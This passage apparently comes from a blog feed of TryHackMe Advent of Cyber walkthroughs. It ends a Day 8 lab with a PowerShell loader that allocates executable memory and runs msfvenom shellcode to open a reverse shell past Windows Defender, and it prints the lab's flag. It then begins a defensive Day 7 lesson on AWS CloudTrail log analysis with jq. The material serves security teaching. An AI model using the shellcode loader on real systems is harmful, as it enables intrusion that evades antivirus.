<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1732683410058.png" alt="creating new file sand saving shellcode" /> \n</p>

<p>Once you’ve added the shellcode navigate to the attached VM, open PowerShell by clicking the PowerShell icon on the taskbar and paste parts of the code from the document you recently created to the Windows PowerShell window. For example, the first part to copy and paste is the block below:</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">$VrtAlloc</span> <span class="o">=</span> <span class="p">@</span><span class="dl">"</span><span class="s2">
using System;
using System.Runtime.InteropServices;

public class VrtAlloc{
    [DllImport(</span><span class="dl">"</span><span class="nx">kernel32</span><span class="dl">"</span><span class="s2">)]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
}
</span><span class="dl">"</span><span class="p">@</span>

<span class="nx">Add</span><span class="o">-</span><span class="nx">Type</span> <span class="nx">$VrtAlloc</span>

<span class="nx">$WaitFor</span><span class="o">=</span> <span class="p">@</span><span class="dl">"</span><span class="s2">
using System;
using System.Runtime.InteropServices;

public class WaitFor{
 [DllImport(</span><span class="dl">"</span><span class="nx">kernel32</span><span class="p">.</span><span class="nx">dll</span><span class="dl">"</span><span class="s2">, SetLastError=true)]
    public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
}
</span><span class="dl">"</span><span class="p">@</span>

<span class="nx">Add</span><span class="o">-</span><span class="nx">Type</span> <span class="nx">$WaitFor</span>

<span class="nx">$CrtThread</span><span class="o">=</span> <span class="p">@</span><span class="dl">"</span><span class="s2">
using System;
using System.Runtime.InteropServices;

public class CrtThread{
 [DllImport(</span><span class="dl">"</span><span class="nx">kernel32</span><span class="dl">"</span><span class="s2">, CharSet=CharSet.Ansi)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

}
</span><span class="dl">"</span><span class="p">@</span>
<span class="nx">Add</span><span class="o">-</span><span class="nx">Type</span> <span class="nx">$CrtThread</span>
</code></pre></div></div>

<p>Then paste the line below, replacing the placeholder with the shellcode generated by msfvenom, and press <code class="language-plaintext highlighter-rouge">Enter</code>.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="nx">Byte</span><span class="p">[]]</span> <span class="nx">$buf</span> <span class="o">=</span> <span class="nx">SHELLCODE_PLACEHOLDER</span>
</code></pre></div></div>

<p>Continue copying and pasting the lines from the code below. Remember, copy one line at a time, paste it, and press <code class="language-plaintext highlighter-rouge">Enter</code>.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="nx">IntPtr</span><span class="p">]</span><span class="nx">$addr</span> <span class="o">=</span> <span class="p">[</span><span class="nx">VrtAlloc</span><span class="p">]::</span><span class="nc">VirtualAlloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nx">$buf</span><span class="p">.</span><span class="nx">Length</span><span class="p">,</span> <span class="mh">0x3000</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">)</span>
<span class="p">[</span><span class="nx">System</span><span class="p">.</span><span class="nx">Runtime</span><span class="p">.</span><span class="nx">InteropServices</span><span class="p">.</span><span class="nx">Marshal</span><span class="p">]::</span><span class="nc">Copy</span><span class="p">(</span><span class="nx">$buf</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nx">$addr</span><span class="p">,</span> <span class="nx">$buf</span><span class="p">.</span><span class="nx">Length</span><span class="p">)</span>
<span class="nx">$thandle</span> <span class="o">=</span> <span class="p">[</span><span class="nx">CrtThread</span><span class="p">]::</span><span class="nc">CreateThread</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nx">$addr</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
<span class="p">[</span><span class="nx">WaitFor</span><span class="p">]::</span><span class="nc">WaitForSingleObject</span><span class="p">(</span><span class="nx">$thandle</span><span class="p">,</span> <span class="p">[</span><span class="nx">uint32</span><span class="p">]</span><span class="dl">"</span><span class="s2">0xFFFFFFFF</span><span class="dl">"</span><span class="p">)</span>
</code></pre></div></div>

<p>If you’ve done it properly, the PowerShell terminal in the VM will look like the screenshot below:</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1732698537726.png" alt="PowerShell screenshot after executing the script" /> \n</p>

<p>Once you execute the final line in the PowerShell terminal and press <code class="language-plaintext highlighter-rouge">Enter</code>, you will get a reverse shell in the AttackBox, giving you complete access to the computer even if the Windows Defender is enabled. Now you can issue any command, like issuing <code class="language-plaintext highlighter-rouge">dir</code>, which will list all the directories.</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1727972837925.png" alt="successful shell screenshot" /></p>

<h2 id="regaining-access">Regaining Access</h2>

<p><em>Now Glitch must act, no time to delay,</em></p>

<p><em>To fix the shellcode and keep foes at bay.</em></p>

<p><em>He tweaks and he codes to set the wrongs right,</em></p>

<p><em>Protecting his secrets with all of his might.</em></p>

<ul>
  <li>\n *</li>
</ul>

<p>Let’s dive into the story and troubleshoot the issue in this part of the task. Glitch has realised he’s no longer receiving incoming connections from his home base. Mayor Malware’s minion team seems to have tampered with the shellcode and updated both the IP and port, preventing Glitch from connecting. The correct IP address for Glitch is <code class="language-plaintext highlighter-rouge">ATTACKBOX_IP</code>, and the successful connection port should be <code class="language-plaintext highlighter-rouge">4444</code>.</p>

<p>Can you help Glitch identify and update the shellcode with the correct IP and port to restore the connection and reclaim control?</p>

<p>Answer the questions below</p>

<p>What is the flag value once Glitch gets reverse shell on the digital vault using port 4444? Note: The flag may take around a minute to appear in the <strong>C:\Users\glitch\Desktop</strong> directory. You can view the content of the flag by using the command <strong>type C:\Users\glitch\Desktop\flag.txt</strong>.</p>

<p>AOC{GOT_MY_ACCESS_B@CK007}</p>

<p>Are you interested in learning more about evasion? Take a look at the <a href="https://tryhackme.com/r/room/avevasionshellcode">AV Evasion: Shellcode</a> room.</p>]]></content><author><name>Michael</name></author><category term="documentation" /><category term="AoC" /><summary type="html"><![CDATA[The Story]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/Day8Header.png" /><media:content medium="image" url="http://localhost:4000/Day8Header.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Try Hackme Advent of Cyber - Day 7</title><link href="http://localhost:4000/Day7" rel="alternate" type="text/html" title="Try Hackme Advent of Cyber - Day 7" /><published>2024-12-07T00:00:00-05:00</published><updated>2024-12-07T00:00:00-05:00</updated><id>http://localhost:4000/Day7</id><content type="html" xml:base="http://localhost:4000/Day7"><![CDATA[<p>The Story</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/5dbea226085ab6182a2ee0f7-1730384938554.png" alt="Task banner for day 7." /></p>

<p><em>As SOC-mas approached, so did the need,</em></p>

<p><em>To provide those without, with something to read.</em></p>

<p><em>Care4Wares tried, they made it their mission,</em></p>

<p><em>A gift for all wares, a SOC-mas tradition.</em></p>

<p><em>Although they had some, they still needed more,</em></p>

<p><em>To pick up some books, they’d head to the store.</em></p>

<p><em>The town’s favourite books, would no doubt make them jolly,</em></p>

<p><em>They ticked off the list, as they filled up the trolley.</em></p>

<p><em>With the last book ticked off, the shopping was done,</em></p>

<p><em>When asked for their card, the ware handed them one.</em></p>

<p><em>“I’m sorry” he said, as the shop clerk reclined,</em></p>

<p><em>“I can’t sell you these books, as your card has declined.”</em></p>

<p><em>The ware put them back, as they walked in confusion,</em></p>

<p><em>How could this be? An attack? An intrusion?</em></p>

<p><em>And when they logged on, the ware got a scare,</em></p>

<p><em>To find the donations, they just weren’t there!</em></p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6228f0d4ca8e57005149c3e3/room-content/6228f0d4ca8e57005149c3e3-1731078051718.png" alt="ware buying books image" /> \n</p>

<h2 id="monitoring-in-an-aws-environment">Monitoring in an AWS Environment</h2>

<p>Care4Wares’ infrastructure runs in the cloud, so they chose AWS as their Cloud Service Provider (CSP). Instead of their workloads running on physical machines on-premises, they run on virtualised instances in the cloud. These instances are (in AWS) called EC2 instances (Amazon Elastic Compute Cloud). A few members of the Wareville SOC aren’t used to log analysis on the cloud, and with a change of environment comes a change of tools and services needed to perform their duties. Their duties this time are to help Care4Wares figure out what has happened to the charity’s funds; to do so, they will need to learn about an AWS service called CloudWatch.</p>

<p><strong>CloudWatch</strong></p>

<p>AWS CloudWatch is a monitoring and observability platform that gives us greater insight into our AWS environment by monitoring applications at multiple levels. CloudWatch provides functionalities such as the monitoring of system and application metrics and the configuration of alarms on those metrics for the purposes of today’s investigation, though we want to focus specifically on CloudWatch logs. Running an application in a cloud environment can mean leveraging lots of different services (e.g. a service running the application, a service running functions triggered by that application, a service running the application backend, etc.); this translates to logs being generated from lots of different sources. CloudWatch logs make it easy for users to access, monitor and store the logs from all these various sources. A CloudWatch agent must be installed on the appropriate instance for application and system metrics to be captured.</p>

<p>A key feature of CloudWatch logs that will help the Warevile SOC squad and us make sense of what happened in their environment is the ability to query application logs using filter patterns. Here are some CloudWatch terms you should know before going further:</p>

<ul>
  <li><strong>Log Events:</strong> A log event is a single log entry recording an application “event”; these will be timestamped and packaged with log messages and metadata.</li>
  <li><strong>Log Streams:</strong> Log streams are a collection of log events from a single source.</li>
  <li><strong>Log Groups:</strong> Log groups are a collection of log streams. Log streams are collected into a log group when logically it makes sense, for example, if the same service is running across multiple hosts.</li>
</ul>

<p><strong>CloudTrail</strong></p>

<p>CloudWatch can track infrastructure and application performance, but what if you wanted to monitor actions in your AWS environment? These would be tracked using another service called AWS CloudTrail. Actions can be those taken by a user, a role (granted to a user giving them certain permissions) or an AWS service and are recorded as events in AWS CloudTrail. Essentially, any action the user takes (via the management console or AWS CLI) or service will be captured and stored. Some features of CloudTrail include:</p>

<ul>
  <li><strong>Always On:</strong> CloudTrail is enabled by default for all users</li>
  <li><strong>JSON-formatted:</strong> All event types captured by CloudTrail will be in the CloudTrail JSON format</li>
  <li><strong>Event History:</strong> When users access CloudTrail, they will see an option “Event History”, event history is a record of the actions that have taken place in the last 90 days. These records are queryable and can be filtered on attributes such as “resource” type.</li>
  <li><strong>Trails:</strong> The above-mentioned event history can be thought of as the default “trail,” included out of the box. However, users can define custom trails to capture specific actions, which is useful if you have bespoke monitoring scenarios you want to capture and store <strong>beyond the 90-day event history retention period</strong>.</li>
  <li><strong>Deliverable:</strong>  As mentioned, CloudWatch can be used as a single access point for logs generated from various sources; CloudTrail is no different and has an optional feature enabling <strong>CloudTrail logs to be delivered to CloudWatch</strong>.</li>
</ul>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6228f0d4ca8e57005149c3e3/room-content/6228f0d4ca8e57005149c3e3-1731078142249.png" alt="JSON rain image" /> \n</p>

<p>As mentioned, Cloudtrail helps capture and record actions taken. These actions could be interactions with any number of AWS services. For example, services like <strong>S3</strong> (Amazon Simple Storage Service used for object storage) and <strong>IAM</strong> (AWS’s Identity and Access Management service can be used to secure access to your AWS environment with the creation of identities and the assigning of access permissions to those identities) will have actions taken within their service recorded. These recorded events can be very helpful when performing an investigation. \n</p>

<h2 id="intro-to-jq">Intro to JQ</h2>

<p><strong>What is JQ?</strong></p>

<p>Earlier, it was mentioned that Cloudtrail logs were JSON-formatted. When ingested in large volumes, this machine-readable format can be tricky to extract meaning from, especially in the context of log analysis. The need then arises for something to help us transform and filter that JSON data into meaningful data we can understand and use to gain security insights. That’s exactly what JQ is (and does!). Similar to command line tools like sed, awk and grep, JQ is a lightweight and flexible command line processor that can be used on JSON.</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6228f0d4ca8e57005149c3e3/room-content/6228f0d4ca8e57005149c3e3-1731078090249.png" alt="Cloud JQ investigation image" /> \n</p>

<p><strong>How Can It Be Used?</strong></p>

<p>Now, let’s take a look at how we use JQ to transform and filter JSON data. The wares being the wares, they stored their shopping list from the trip to the bookstore in JSON format. Let’s take a look at that:</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span>

<span class="p">{</span> <span class="dl">"</span><span class="s2">book_title</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Wares Wally</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">genre</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">children</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">page_count</span><span class="dl">"</span><span class="p">:</span> <span class="mi">20</span> <span class="p">},</span>

<span class="p">{</span> <span class="dl">"</span><span class="s2">book_title</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Charlottes Web Crawler</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">genre</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">young_ware</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">page_count</span><span class="dl">"</span><span class="p">:</span> <span class="mi">120</span> <span class="p">},</span>

<span class="p">{</span> <span class="dl">"</span><span class="s2">book_title</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Charlie and the 8 Bit Factory</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">genre</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">young_ware</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">page_count</span><span class="dl">"</span><span class="p">:</span> <span class="mi">108</span> <span class="p">},</span>

<span class="p">{</span> <span class="dl">"</span><span class="s2">book_title</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">The Princess and the Pcap</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">genre</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">children</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">page_count</span><span class="dl">"</span><span class="p">:</span> <span class="mi">48</span> <span class="p">},</span>

<span class="p">{</span> <span class="dl">"</span><span class="s2">book_title</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">The Lion, the Glitch and the Wardrobe</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">genre</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">young_ware</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">page_count</span><span class="dl">"</span><span class="p">:</span> <span class="mi">218</span> <span class="p">}</span>

<span class="p">]</span>
</code></pre></div></div>

<p>JQ takes two inputs: the filter you want to use, followed by the input file. We start our JQ filter with a <code class="language-plaintext highlighter-rouge">.</code> which just tells JQ we are accessing the current input. From here, we want to access the array of values stored in our JSON (with the <code class="language-plaintext highlighter-rouge">[]</code>). Making our filter a <code class="language-plaintext highlighter-rouge">.[]</code>. For example, let’s run the following command.</p>

<p>JQ syntax</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">user</span><span class="p">@</span><span class="nd">tryhackme</span><span class="nx">$</span> <span class="nx">jq</span> <span class="dl">'</span><span class="s1">.[]</span><span class="dl">'</span> <span class="nx">book_list</span><span class="p">.</span><span class="nx">json</span>
</code></pre></div></div>

<p>The command above would result in this output:</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span>
  <span class="dl">"</span><span class="s2">book_title</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Wares Wally</span><span class="dl">"</span><span class="p">,</span>
  <span class="dl">"</span><span class="s2">genre</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">children</span><span class="dl">"</span><span class="p">,</span>
  <span class="dl">"</span><span class="s2">page_count</span><span class="dl">"</span><span class="p">:</span> <span class="mi">20</span>
<span class="p">}</span>
<span class="p">{</span>
  <span class="dl">"</span><span class="s2">book_title</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Charlottes Web Crawler</span><span class="dl">"</span><span class="p">,</span>
  <span class="dl">"</span><span class="s2">genre</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">young_ware</span><span class="dl">"</span><span class="p">,</span>
  <span class="dl">"</span><span class="s2">page_count</span><span class="dl">"</span><span class="p">:</span> <span class="mi">120</span>
<span class="p">}</span>
<span class="p">{</span>
  <span class="dl">"</span><span class="s2">book_title</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Charlie and the 8 Bit Factory</span><span class="dl">"</span><span class="p">,</span>
  <span class="dl">"</span><span class="s2">genre</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">young_ware</span><span class="dl">"</span><span class="p">,</span>
  <span class="dl">"</span><span class="s2">page_count</span><span class="dl">"</span><span class="p">:</span> <span class="mi">108</span>
<span class="p">}</span>
<span class="p">{</span>
  <span class="dl">"</span><span class="s2">book_title</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">The Princess and the Pcap</span><span class="dl">"</span><span class="p">,</span>
  <span class="dl">"</span><span class="s2">genre</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">children</span><span class="dl">"</span><span class="p">,</span>
  <span class="dl">"</span><span class="s2">page_count</span><span class="dl">"</span><span class="p">:</span> <span class="mi">48</span>
<span class="p">}</span>
<span class="p">{</span>
  <span class="dl">"</span><span class="s2">book_title</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">The Lion, the Glitch and the Wardrobe</span><span class="dl">"</span><span class="p">,</span>
  <span class="dl">"</span><span class="s2">genre</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">young_ware</span><span class="dl">"</span><span class="p">,</span>
  <span class="dl">"</span><span class="s2">page_count</span><span class="dl">"</span><span class="p">:</span> <span class="mi">218</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Once we’ve accessed the array, we can grab elements from that array by going one step deeper. For example, we could run this JQ command:</p>

<p>JQ syntax</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">user</span><span class="p">@</span><span class="nd">tryhackme</span><span class="nx">$</span> <span class="nx">jq</span>  <span class="dl">'</span><span class="s1">.[] | .book_title</span><span class="dl">'</span> <span class="nx">book_list</span><span class="p">.</span><span class="nx">json</span>
</code></pre></div></div>

<p>If we wanted to view all the book titles contained within this JSON file, this would return a nicely formatted output like this:</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="dl">"</span><span class="s2">Wares Wally</span><span class="dl">"</span>
<span class="dl">"</span><span class="s2">Charlottes Web Crawler</span><span class="dl">"</span>
<span class="dl">"</span><span class="s2">Charlie and the 8 Bit Factory</span><span class="dl">"</span>
<span class="dl">"</span><span class="s2">The Princess and the Pcap</span><span class="dl">"</span>
<span class="dl">"</span><span class="s2">The Lion, the Glitch and the Wardrobe</span><span class="dl">"</span>
</code></pre></div></div>

<p>That’s a lot nicer to look at, isn’t it? It gives you an idea of what JQ is and what it does. Of course, JQ can filter and transform JSON data in many additional ways. In our upcoming investigation, we’ll see the tool in action.</p>

<h2 id="the-peculiar-case-of-care4wares-dry-funds">The Peculiar Case of Care4Wares’ Dry Funds</h2>

<p>Now that we have refreshed our knowledge of AWS Cloudtrail and JQ alongside McSkidy, let’s investigate this peculiar case of Care4Wares’ dry funds.</p>

<p>The responsible ware for the Care4Wares charity drive gave us the following info regarding this incident:</p>

<p><em>We sent out a link on the 28th of November to everyone in our network that points to a flyer with the details of our charity. The details include the account number to receive donations. We received many donations the first day after sending out the link, but there were none from the second day on. I talked to multiple people who claimed to have donated a respectable sum. One showed his transaction, and I noticed the account number was wrong. I checked the link, and it was still the same. I opened the link, and the digital flyer was the same except for the account number.</em></p>

<p>McSkidy recalls putting the digital flyer, <strong>wareville-bank-account-qr.png</strong>, in an Amazon AWS S3 bucket named <strong>wareville-care4wares</strong>. Let’s assist McSkidy and start by finding out more about that link. Before that, let’s first review the information that we currently have to start the investigation:</p>

<ul>
  <li>The day after the link was sent out, several donations were received.</li>
  <li>Since the second day after sending the link, no more donations have been received.</li>
  <li>A donator has shown proof of his transaction. It was made 3 days after he received the link. The account number in the transaction was not correct.</li>
  <li>McSkidy put the digital flyer in the AWS S3 object named <strong>wareville-bank-account-qr.png</strong> under the bucket <strong>wareville-care4wares</strong>.</li>
  <li>The link has not been altered.</li>
</ul>

<h2 id="connection-details">Connection Details</h2>

<p>Now that we have enough information, let’s start the attached Virtual Machine in this task by clicking the Start Machine button below. Note that the machine may take 3-5 minutes to initialise.</p>

<p>The machine will start in a split-screen view. If the VM is not visible, use the blue Show Split View button at the top right of the page.</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/5dbea226085ab6182a2ee0f7-1730138006613.png" alt="Connection card for Day 7 - VM in split-screen." /> \n</p>

<h2 id="glitch-did-it">Glitch Did It</h2>

<p>Let’s examine the Cloudtrail logs related to the <strong>wareville-care4wares</strong> S3 bucket. For a quick example, a typical S3 log entry looks like this:</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span>
  <span class="dl">"</span><span class="s2">eventVersion</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">1.10</span><span class="dl">"</span><span class="p">,</span>
  <span class="dl">"</span><span class="s2">userIdentity</span><span class="dl">"</span><span class="p">:</span> <span class="p">{</span>
    <span class="dl">"</span><span class="s2">type</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">IAMUser</span><span class="dl">"</span><span class="p">,</span>
    <span class="dl">"</span><span class="s2">principalId</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">AIDAXRMKYT5O5Y2GLD4ZG</span><span class="dl">"</span><span class="p">,</span>
    <span class="dl">"</span><span class="s2">arn</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">arn:aws:iam::518371450717:user/wareville_collector</span><span class="dl">"</span><span class="p">,</span>
    <span class="dl">"</span><span class="s2">accountId</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">518371450717</span><span class="dl">"</span><span class="p">,</span>
    <span class="dl">"</span><span class="s2">accessKeyId</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">AKIAXRMKYT5OZCZPGNZ7</span><span class="dl">"</span><span class="p">,</span>
    <span class="dl">"</span><span class="s2">userName</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">wareville_collector</span><span class="dl">"</span>
  <span class="p">},</span>
  <span class="dl">"</span><span class="s2">eventTime</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">2024-10-21T22:13:24Z</span><span class="dl">"</span><span class="p">,</span>
  <span class="dl">"</span><span class="s2">eventSource</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">s3.amazonaws.com</span><span class="dl">"</span><span class="p">,</span>
  <span class="dl">"</span><span class="s2">eventName</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">ListObjects</span><span class="dl">"</span><span class="p">,</span>
  <span class="dl">"</span><span class="s2">awsRegion</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">ap-southeast-1</span><span class="dl">"</span><span class="p">,</span>
  <span class="dl">"</span><span class="s2">sourceIPAddress</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">34.247.218.56</span><span class="dl">"</span><span class="p">,</span>
  <span class="dl">"</span><span class="s2">userAgent</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">[aws-sdk-go/0.24.0 (go1.22.6; linux; amd64)]</span><span class="dl">"</span><span class="p">,</span>
  <span class="dl">"</span><span class="s2">requestParameters</span><span class="dl">"</span><span class="p">:</span> <span class="p">{</span>
    <span class="dl">"</span><span class="s2">bucketName</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">aoc-cloudtrail-wareville</span><span class="dl">"</span><span class="p">,</span>
    <span class="dl">"</span><span class="s2">Host</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">aoc-cloudtrail-wareville.s3.ap-southeast-1.amazonaws.com</span><span class="dl">"</span><span class="p">,</span>
    <span class="dl">"</span><span class="s2">prefix</span><span class="dl">"</span><span class="p">:</span> <span class="dl">""</span>
  <span class="p">},</span>
  <span class="dl">"</span><span class="s2">responseElements</span><span class="dl">"</span><span class="p">:</span> <span class="kc">null</span><span class="p">,</span>
  <span class="dl">"</span><span class="s2">additionalEventData</span><span class="dl">"</span><span class="p">:</span> <span class="p">{</span>
    <span class="dl">"</span><span class="s2">SignatureVersion</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">SigV4</span><span class="dl">"</span><span class="p">,</span>
    <span class="dl">"</span><span class="s2">CipherSuite</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">TLS_AES_128_GCM_SHA256</span><span class="dl">"</span><span class="p">,</span>
    <span class="dl">"</span><span class="s2">bytesTransferredIn</span><span class="dl">"</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span>
    <span class="dl">"</span><span class="s2">AuthenticationMethod</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">AuthHeader</span><span class="dl">"</span><span class="p">,</span>
    <span class="dl">"</span><span class="s2">x-amz-id-2</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">yqniVtqBrL0jNyGlvnYeR3BvJJPlXdgxvjAwwWhTt9dLMbhgZugkhlH8H21Oo5kNLiq8vg5vLoj3BNl9LPEAqN5iHpKpZ1hVynQi7qrIDk0=</span><span class="dl">"</span><span class="p">,</span>
    <span class="dl">"</span><span class="s2">bytesTransferredOut</span><span class="dl">"</span><span class="p">:</span> <span class="mi">236375</span>
  <span class="p">},</span>
  <span class="dl">"</span><span class="s2">requestID</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">YKEKJP7QX32B4NZB</span><span class="dl">"</span><span class="p">,</span>
  <span class="dl">"</span><span class="s2">eventID</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">fd80529f-d0af-4f44-8034-743d8d92bdcf</span><span class="dl">"</span><span class="p">,</span>
  <span class="dl">"</span><span class="s2">readOnly</span><span class="dl">"</span><span class="p">:</span> <span class="kc">true</span><span class="p">,</span>
  <span class="dl">"</span><span class="s2">resources</span><span class="dl">"</span><span class="p">:</span> <span class="p">[</span>
    <span class="p">{</span>
      <span class="dl">"</span><span class="s2">type</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">AWS::S3::Object</span><span class="dl">"</span><span class="p">,</span>
      <span class="dl">"</span><span class="s2">ARNPrefix</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">arn:aws:s3:::aoc-cloudtrail-wareville/</span><span class="dl">"</span>
    <span class="p">},</span>
    <span class="p">{</span>
      <span class="dl">"</span><span class="s2">accountId</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">518371450717</span><span class="dl">"</span><span class="p">,</span>
      <span class="dl">"</span><span class="s2">type</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">AWS::S3::Bucket</span><span class="dl">"</span><span class="p">,</span>
      <span class="dl">"</span><span class="s2">ARN</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">arn:aws:s3:::aoc-cloudtrail-wareville</span><span class="dl">"</span>
    <span class="p">}</span>
  <span class="p">],</span>
  <span class="dl">"</span><span class="s2">eventType</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">AwsApiCall</span><span class="dl">"</span><span class="p">,</span>
  <span class="dl">"</span><span class="s2">managementEvent</span><span class="dl">"</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span>
  <span class="dl">"</span><span class="s2">recipientAccountId</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">518371450717</span><span class="dl">"</span><span class="p">,</span>
  <span class="dl">"</span><span class="s2">eventCategory</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Data</span><span class="dl">"</span><span class="p">,</span>
  <span class="dl">"</span><span class="s2">tlsDetails</span><span class="dl">"</span><span class="p">:</span> <span class="p">{</span>
    <span class="dl">"</span><span class="s2">tlsVersion</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">TLSv1.3</span><span class="dl">"</span><span class="p">,</span>
    <span class="dl">"</span><span class="s2">cipherSuite</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">TLS_AES_128_GCM_SHA256</span><span class="dl">"</span><span class="p">,</span>
    <span class="dl">"</span><span class="s2">clientProvidedHostHeader</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">aoc-cloudtrail-wareville.s3.ap-southeast-1.amazonaws.com</span><span class="dl">"</span>
  <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

